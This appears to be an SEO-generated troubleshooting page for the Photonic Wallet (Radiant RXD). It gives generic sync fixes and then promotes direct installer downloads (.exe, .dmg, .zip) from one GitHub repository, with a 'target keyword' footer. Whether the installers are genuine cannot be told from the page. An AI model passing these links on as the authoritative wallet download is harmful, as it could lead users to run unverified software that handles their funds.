<div align="center">

<img src="https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/photonic-wallet-radiant-rxd-banner-b-minimal-ribbon.png" alt="Photonic Wallet for Radiant (RXD) banner" width="100%">

# Photonic Wallet not syncing

[![Website](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-website-photonicwallet-org.svg)](https://photonicwallet.org) [![Release](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-release-v3-0-4.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) [![Docs](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-docs-guides.svg)](https://github.com/Radiant-projects/photonic-wallet-docs)

</div>

> **Short answer:** Restart the app, switch to another server and confirm your internet connection; then update to the latest release.

---

## You'll see this if

- Sync spinner never stops
- Block height stuck
- Wallet offline badge

## Why it happens

A busy or offline server, a firewall rule, or an outdated release blocks sync. More background lives in our guide on [change the electrumx server in photonic](change-electrumx-server-photonic.md) and on the [troubleshooting guide](https://photonicwallet.org/guides/troubleshooting).

## Fix it step by step

1. Restart Photonic.
2. Change server in settings.
3. Allow the app through your firewall.
4. Install the latest release.

## If that didn't work

Try another network (for example a phone hotspot) to rule out router blocks. The [FAQ](https://photonicwallet.org/faq) covers related cases, and [RXD transaction stuck unconfirmed](rxd-transaction-unconfirmed.md) may match your situation.

## Prevention

Update whenever a new tagged release appears.

> [!WARNING]
> Photonic Wallet will never ask for your seed phrase. Never type it into a website, form or chat.

## FAQ

<details>
<summary><b>Does sync risk funds?</b></summary>

No. It only reads data.

</details>

<details>
<summary><b>Can VPNs cause it?</b></summary>

Sometimes; try without one.

</details>

---

## Get the latest Photonic Wallet

The fix starts with the current desktop release, **[Photonic Wallet v3.0.4](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4)**.

<div align="center">

[![Download Photonic Wallet for Windows](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-download-windows.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) [![Download Photonic Wallet for macOS](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-download-macos.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) [![Download Photonic Wallet for Linux](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-download-linux.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip)

</div>

| Platform | File | Requirements |
|---|---|---|
| **Windows** | [`photonic-wallet-v3.0.4.exe`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) | Windows 10/11, 64-bit |
| **macOS** | [`photonic-wallet-v3.0.4.dmg`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) | macOS (DMG package) |
| **Linux** | [`photonic-wallet-v3.0.4.zip`](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip) | x64, ZIP archive |

> [!TIP]
> Compare the SHA-256 checksum with the table on the [tagged release](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) before you run the installer. Source code: [Radiant-projects/Photonic-Wallet](https://github.com/Radiant-projects/Photonic-Wallet).

## Related guides

| Guide | |
|---|---|
| [Change the ElectrumX server in Photonic](change-electrumx-server-photonic.md) | Photonic Wallet guide |
| [RXD transaction stuck unconfirmed](rxd-transaction-unconfirmed.md) | Photonic Wallet guide |
| [Photonic Wallet connection error](photonic-wallet-connection-error.md) | Photonic Wallet guide |
| [All Photonic guides](../README.md) | Docs index |

<sub>Target keyword: photonic wallet not syncing · [photonicwallet.org](https://photonicwallet.org) · [Download](https://photonicwallet.org/download)</sub>
